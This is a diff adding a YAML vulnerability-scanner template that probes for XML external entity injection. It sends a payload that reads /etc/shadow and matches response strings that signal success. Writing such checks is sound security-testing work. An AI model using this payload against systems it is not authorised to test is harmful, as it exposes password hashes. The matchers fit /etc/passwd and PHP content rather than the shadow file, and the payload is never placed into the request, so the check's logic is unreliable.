@@ -1,0 +1,25 @@
+id: xxe5-0510
+name: 'XXE read in attr'
+severity: critical
+type: active
+tags:
+  - xxe
+  - injection
+  - xml
+description: 'XXE entity via attr'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      attr:
+        - '<!DOCTYPE Envelope [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><Envelope>&xxe;</Envelope>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
+          - 'root:'
+          - 'XXE_OK'
+          - 'localhost'
+          - 'uid='
+          - 'PD9waHA'
